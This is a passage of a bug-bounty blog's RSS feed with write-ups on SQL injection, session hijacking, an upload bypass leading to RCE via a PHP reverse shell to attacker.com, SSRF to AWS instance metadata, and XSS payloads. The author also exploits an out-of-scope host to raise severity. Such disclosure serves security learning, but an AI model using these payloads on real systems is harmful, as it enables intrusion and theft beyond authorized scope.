+&lt;p&gt;The scope of this program is very limited, but the target domain has lots of subdomains. The first thing that comes to mind is looking for XSS Vulnerabilities in target subdomains that are &lt;strong&gt;out of scope&lt;/strong&gt; to trigger Cookie Based XSS in &lt;strong&gt;in-scope&lt;/strong&gt; target domains, so by that severity will increase at least to High or Medium.&lt;/p&gt;
+
+&lt;h4 id=&quot;i-information-disclosure&quot;&gt;I. Information Disclosure&lt;/h4&gt;
+
+&lt;p&gt;After hunting for some time, no subdomains that have XSS vulnerabilities were found either. Until when doing a &lt;em&gt;bruteforce&lt;/em&gt; directory on one of the subdomains, I found an interesting file.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://redacted.com/redacted/redacted/_notes/dwsync.xml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dwsync.xml&lt;/code&gt; file is a file generated by Dreamweaver. Where the file contains information related to what files are in the website directory.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/df2e430d20474a0262177c6b7663106d-1.png&quot; alt=&quot;Figure 1 — dwsync.xml File&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;ii-sql-injection&quot;&gt;II. SQL Injection&lt;/h4&gt;
+
+&lt;p&gt;By default, to access the website requires credentials, and we cannot create an account on the website. As explained above, through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dwsync.xml&lt;/code&gt; file, we can get information related to what files are on the target website. So I tried to access one of the files, for example I tried to access the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;redacted.php&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/df2e430d20474a0262177c6b7663106d-2.png&quot; alt=&quot;Figure 2 — redacted.php File&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see an error message appears: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Undefined index: ver&lt;/code&gt;, which means on that page there is a variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ver&lt;/code&gt; that has not been defined. For that, I also changed the URL to something like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://redacted.com/dir/redacted.php?ver=1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And the page display changes, but only displays the number &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/df2e430d20474a0262177c6b7663106d-3.png&quot; alt=&quot;Figure 3 — redacted.php with ver variable&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Don’t know what the meaning of number 1 is, that number is also not a reflection of the value I entered in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ver&lt;/code&gt; parameter above. But seeing the parameter in the URL, my hand felt &lt;em&gt;itchy&lt;/em&gt; to add the symbol &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;‘&lt;/code&gt; to that parameter. And the result …&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/df2e430d20474a0262177c6b7663106d-4.png&quot; alt=&quot;Figure 4 — SQL Error Message&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It looks like the error message looks very familiar. Without waiting long, I immediately tried to do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQL Injection&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLmap&lt;/code&gt;. And here is the list of databases obtained:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] redacted_db
+[*] tmp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;iii-authentication-bypass&quot;&gt;III. Authentication Bypass&lt;/h4&gt;
+
+&lt;p&gt;From the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQL Injection&lt;/code&gt; vulnerability, I tried to upload shell to the target server, but it’s failed. So I must be able to login to the website using the data in the database.&lt;/p&gt;
+
+&lt;p&gt;After trying to extract the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;redacted_db&lt;/code&gt; database, a table named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user_tbl&lt;/code&gt; was found. In the table there is information related to the user on the target website. But unfortunately, the user’s password is hashed using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;md5&lt;/code&gt; and when trying to crack, nothing works.&lt;/p&gt;
+
+&lt;p&gt;Not giving up until then, I went back to look for tables that might be used. So I arrived at a table called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;session_tbl&lt;/code&gt;. In the table, there are only 3 columns, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;session_id&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user_id&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;session&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;From there I realized that the table contained active sessions from the website user. So I searched for the user with the highest role level in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user_tbl&lt;/code&gt; table, and searched for the session in the session table. Then I tried to enter the session value obtained from the database into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cookie&lt;/code&gt; website with the session name. And finally I successfully login to the website.&lt;/p&gt;
+
+&lt;h4 id=&quot;iv-unrestricted-file-upload&quot;&gt;IV. Unrestricted File Upload&lt;/h4&gt;
+
+&lt;p&gt;Long story short, after being able to log into the target website, then I look for other vulnerabilities that can be exploited. On the website there is a feature for uploading files. Of course this is a feature that we must test.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/df2e430d20474a0262177c6b7663106d-5.png&quot; alt=&quot;Figure 5 — File Upload Form&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I also tried to upload a file with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.phtml&lt;/code&gt; extension, but the file was rejected and could not be uploaded.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/df2e430d20474a0262177c6b7663106d-6.png&quot; alt=&quot;Figure 6 — File Rejected&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But I suspect, the filter only runs on the client side. This means that there is potential for bypasses with the help of tools such as Burpsuite. So I tried uploading the file again, this time with the .jpg extension then in Burpsuite Intercept, I change the extension to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.phtml&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Here’s the screenshot when I re-upload the file using Repeater.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/df2e430d20474a0262177c6b7663106d-7.png&quot; alt=&quot;Figure 7 — File Uploaded&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After using the method above, the file was successfully uploaded. Seeing the response that appears, the file is stored in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AWS&lt;/code&gt;, not on the target website&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://storage-redacted.s3-ap-southeast-1.amazonaws.com/redacted_dir/redacted_file.phtml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;v-remote-code-execution&quot;&gt;V. Remote Code Execution&lt;/h4&gt;
+
+&lt;p&gt;Seeing the uploaded file stored in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AWS&lt;/code&gt;, not much can be done on that file, because our target is the web server not the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AWS&lt;/code&gt; server. So I also tried to understand the response displayed by the target server.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/var/www/html/redacted/../redacted****/var/www/html/redacted/../redacted/info.phtml&amp;lt;br&amp;gt;Uploading part 2 of /var/www/html/redacted/../redacted/info.phtml.
+Uploaded /var/www/html/redacted/../redacted/info.phtml to https://storage-redacted.s3-ap-southeast-1.amazonaws.com/redacted_dir/redacted_file.phtml.
+SUCCESS 52673, 98235
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From the response above, I assume that besides being stored on AWS, there is a possibility that uploaded files will be stored on the target website in the &lt;strong&gt;redacted&lt;/strong&gt; directory. So I also tried to visit the following URL:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://redacted.com/redacted/redacted/info.phtml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And the file was not found.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/df2e430d20474a0262177c6b7663106d-8.png&quot; alt=&quot;Figure 8 — File Not Found&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But I still assume, it isn’t make sense if the response displays a &lt;strong&gt;redacted&lt;/strong&gt; directory if it has nothing to do with the file that we uploaded. What if what happens is, the file that we upload is temporarily stored in the &lt;strong&gt;redacted&lt;/strong&gt; directory, then after some time it is thrown into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AWS&lt;/code&gt; as a storage place.&lt;/p&gt;
+
+&lt;p&gt;If my assumption is correct, then our file will be on the server for a second before uploading to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AWS&lt;/code&gt;. And we must catch the file before sending it to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AWS&lt;/code&gt; server.&lt;/p&gt;
+
+&lt;p&gt;To test it, I use &lt;em&gt;Burpsuite Intruder&lt;/em&gt; and try to do a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; Request continuously to the URL file in the &lt;strong&gt;redacted&lt;/strong&gt; directory.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/df2e430d20474a0262177c6b7663106d-9.png&quot; alt=&quot;Figure 9 — File Found&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And sure enough, for some time the file was on the target server &lt;em&gt;(HTTP Code 200)&lt;/em&gt;, and not long after that file disappeared &lt;em&gt;(HTTP Code 404)&lt;/em&gt; indicating the file has been moved to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AWS&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;So by doing the same thing, we can upload &lt;em&gt;PHP Reverse Shell&lt;/em&gt; to get the shell from the target website.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/attacker.com/1337 0&amp;gt;&amp;amp;1'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/df2e430d20474a0262177c6b7663106d-10.png&quot; alt=&quot;Figure 10 — Pwned&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And finally I also got access to the target server.&lt;/p&gt;
+
+&lt;h4 id=&quot;vi-the-xss&quot;&gt;VI. The XSS&lt;/h4&gt;
+
+&lt;p&gt;Back to first of story, after getting shell access, I placed an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTML&lt;/code&gt; file containing javascript to trigger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XSS&lt;/code&gt; on websites that were in the bounty scope.&lt;/p&gt;
+
+&lt;p&gt;With HTML code like the this:&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;evil=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E@;path=/;domain=.redacted.com;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can create a cookie named &lt;strong&gt;evil&lt;/strong&gt; on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;redacted.com&lt;/code&gt; domain with the value containing the XSS Payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/code&gt;. So when you access the in-scope bounty domain, the cookie will be loaded and XSS will be triggered.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/df2e430d20474a0262177c6b7663106d-11.gif&quot; alt=&quot;Figure 11 — Pwned&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Getting full server access on an &lt;strong&gt;out of scope&lt;/strong&gt; website to trigger XSS on an &lt;strong&gt;in-scope&lt;/strong&gt; website is rather ironic indeed. But that’s Bug Hunting, as much as possible we must be able to convince the Program Owner that the vulnerability we find can be exploited and have a significant impact.&lt;/p&gt;
+
+&lt;p&gt;On that website I found a several Cookie Based XSS worth $5000.&lt;/p&gt;
+
+&lt;h4 id=&quot;vii-conclusion&quot;&gt;VII. Conclusion&lt;/h4&gt;
+
+&lt;p&gt;Here’s some noob tips that you can do when doing Bug Hunting:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;When finding vulnerability with a low severity, don’t report it immediately. Look for possibilities that can be used to increase the severity.&lt;/li&gt;
+  &lt;li&gt;If you find a website with a login page without a registration feature, try to &lt;strong&gt;bruteforce&lt;/strong&gt; it using &lt;em&gt;dirsearch&lt;/em&gt;, &lt;em&gt;dirbuster&lt;/em&gt;, etc. Websites that only display a login page and no registration feature indicate that the website can only be accessed by an internal team, and usually such websites have lots of bugs.&lt;/li&gt;
+  &lt;li&gt;If you find &lt;strong&gt;SQL Injection&lt;/strong&gt; and a password is hashed on the database, try to visit another table, there might be something juicy there.&lt;/li&gt;
+  &lt;li&gt;If you find the upload form and you cannot upload the shell. Try to bypass it by trying to upload via Burpsuite Repeater, changing extensions, mime type, etc. After the file has been uploaded successfully, learn the flow how they save the file.&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>2020-01-18</pubDate>
+        <link>http://localhost:4000/articles/2019-09/exploiting-cookie-based-xss-by-finding-rce</link>
+        <guid isPermaLink="true">http://localhost:4000/articles/2019-09/exploiting-cookie-based-xss-by-finding-rce</guid>
+        
+        <category>bug hunting</category>
+        
+        <category>hacking</category>
+        
+        <category>lfd</category>
+        
+        <category>sql injection</category>
+        
+        <category>rce</category>
+        
+        <category>xss</category>
+        
+        
+        <category>bug hunting</category>
+        
+      </item>
+    
+      <item>
+        <title>AWS Metadata Disclosure via “Hardcoded Host” Download Function</title>
+        <description>&lt;p&gt;Sometimes, when visiting a website, we find a link to download files from that site. The downloaded file can be a guide, tutorial, or another other document.&lt;/p&gt;
+
+&lt;p&gt;When hunting private programs on Bugcrowd, I found a link to download PDF files with the following format:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://redacted.com/download?file=/2019/08/file.pdf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When accessing the link, then the browser will download the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file.pdf&lt;/code&gt;. The first I think when finding such a URL, of course I wonder if there is a &lt;strong&gt;Local File Download&lt;/strong&gt; bug on the link.&lt;/p&gt;
+
+&lt;p&gt;So to do the test, I tried to change the URL be like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://redacted.com/download?file=index.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;But nothing happened :(&lt;/p&gt;
+
+&lt;p&gt;There are several possibilities that I can think when found the index.php file could not be downloaded. First, the download feature has been protected so that we cannot download files that are not permitted, or second, the download feature is directed to another host maybe as a CDN or something so that the index.php file does not exist.&lt;/p&gt;
+
+&lt;p&gt;For the second possibility, maybe this is the code used:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'https://cdn.redacted.com'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'file'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$download_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In the code above, it appears that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;host&lt;/code&gt; of the file to be downloaded has been hardcoded in the code, so that we can manipulate only the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; parameter.&lt;/p&gt;
+
+&lt;h4 id=&quot;url-redirection&quot;&gt;URL Redirection&lt;/h4&gt;
+
+&lt;p&gt;To find out if our assumptions about the URL format are correct, the easiest way is to try to redirect to another domain by adding the @ symbol at the end of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; parameter value and followed by the domain.&lt;/p&gt;
+
+&lt;p&gt;Example:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://redacted.com/download?file=/2019/08/file.pdf@www.google.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And boom! The HTML code from &lt;em&gt;www.google.com&lt;/em&gt; was downloaded.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/81591f7af4d3ec85cfb7c1d7856d9ec7-1.png&quot; alt=&quot;www.google.com Source Code&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This means that through this vulnerability we can only download data that is outside the server, cannot access files that are on the target. Then what data can we possibly get?&lt;/p&gt;
+
+&lt;h4 id=&quot;aws-metadata&quot;&gt;AWS Metadata&lt;/h4&gt;
+
+&lt;p&gt;Knowing that the server is on Amazon AWS, so I tried to extract AWS Metadata through the vulnerability.&lt;/p&gt;
+
+&lt;p&gt;AWS Metadata Exists at URL:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://169.254.169.254/latest/meta-data/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then the URL is modified like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://redacted.com/download?file=/2019/08/file.pdf@169.254.169.254/latest/meta-data/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;But nothing happened again :(&lt;/p&gt;
+
+&lt;p&gt;After some time, I realized that the possibility of a hardcode host using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTPS&lt;/code&gt; protocol, so when we try to redirect to the Metadata URL that is using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; protocol, the redirect process doesn’t work.&lt;/p&gt;
+
+&lt;p&gt;For that, I use a little trick, by using a domain that uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTPS&lt;/code&gt; and then redirect again to the URL of the Metadata.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Server Target ---&amp;gt; HTTPS domain ---&amp;gt; URL Metadata
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;For that, I created a simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PHP&lt;/code&gt; file to redirect to Metadata:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'location: http://169.254.169.254/latest/meta-data/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then the file is uploaded to a domain that uses HTTPS. Then the final URL will be like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://redacted.com/download?file=/2019/08/file.pdf@attacker.com/redirect.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And the Metadata was downloaded !&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/81591f7af4d3ec85cfb7c1d7856d9ec7-2.png&quot; alt=&quot;AWS Metadata&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;For this finding, I got &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;P1&lt;/code&gt; on Bugcrowd.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;CWE-200 : Information Exposure&lt;/li&gt;
+  &lt;li&gt;https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>2020-01-18</pubDate>
+        <link>http://localhost:4000/articles/2019-08/aws-metadata-disclosure-via-hardcoded-host-download</link>
+        <guid isPermaLink="true">http://localhost:4000/articles/2019-08/aws-metadata-disclosure-via-hardcoded-host-download</guid>
+        
+        <category>bug hunting</category>
+        
+        <category>hacking</category>
+        
+        <category>lfd</category>
+        
+        <category>aws</category>
+        
+        
+        <category>bug hunting</category>
+        
+      </item>
+    
+      <item>
+        <title>Reflected XSS on Error Page</title>
+        <description>&lt;p&gt;Sometimes to exploit an XSS (specifically Reflected XSS), we are focused on finding input pages such as &lt;strong&gt;Search Columns&lt;/strong&gt; and etc to to find out is that form has an XSS vulnerability or not.&lt;/p&gt;
+
+&lt;p&gt;Not infrequently a developer is only focused on doing sanitation and filters on these attacks on pages that are commonly accessed by visitors. Does not rule out the possibility of XSS attacks can affected on other pages, including an &lt;strong&gt;Error Pages&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;When doing some Private Bug Hunting on Bugcrowd, I found a feature for Uploading and Downloading File. After the file is being uploaded successfully, to download the file, the user will be directed to the URL like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://b15.[redacted.com]/file.php?spaceid=user@mail.com&amp;amp;file=filename.jpg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At first, I thought the URL had an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LFI&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LFD&lt;/code&gt; vulnerability, but after trying to change the file parameters with another file, it didn’t work and gave an error message.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://b15.[redacted.com]/file.php?spaceid=&amp;amp;file=../../../../etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/1602ba3c7472d6e3ebdd237341f8754d-1.png&quot; alt=&quot;LFI Failed&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But if you pay attention, the contents of the file parameter are reflected on the error page. Then I tried to insert an HTML tag to test whether there is a filter or not in the parameters of the file.&lt;/p&gt;
+
+&lt;p&gt;And sure enough, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTML&lt;/code&gt; tags were successfully rendered on that page.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://b15.[redacted.com]/file.php?spaceid=&amp;amp;file=&amp;lt;h1&amp;gt;asu
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/1602ba3c7472d6e3ebdd237341f8754d-2.png&quot; alt=&quot;HTML on Error Page&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Without waiting a long time, I immediately tried an XSS payload on the page and XSS was executed!&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://b15.[redacted.com]/file.php?spaceid=&amp;amp;file=&amp;lt;img src=x onmouseover=alert(1)&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/1602ba3c7472d6e3ebdd237341f8754d-3.png&quot; alt=&quot;XSS on Error Page&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Some tips for hunting Reflected XSS is to test various parameters contained in an endpoint. Either on the Front End Page, or even on the Error Page like the example above.&lt;/p&gt;
+
+&lt;p&gt;So this article was written, hopefully it will be useful for us all.&lt;/p&gt;
+</description>
+        <pubDate>2020-01-18</pubDate>
+        <link>http://localhost:4000/articles/2019-06/reflected-xss-on-error-page</link>
+        <guid isPermaLink="true">http://localhost:4000/articles/2019-06/reflected-xss-on-error-page</guid>
+        
+        <category>bug hunting</category>
+        
+        <category>hacking</category>
+        
+        <category>xss</category>
+        
+        
+        <category>bug hunting</category>
+        
+      </item>
+    
+      <item>
+        <title>How I Found Multiple Vulnerabilities on AntiHack.Me</title>
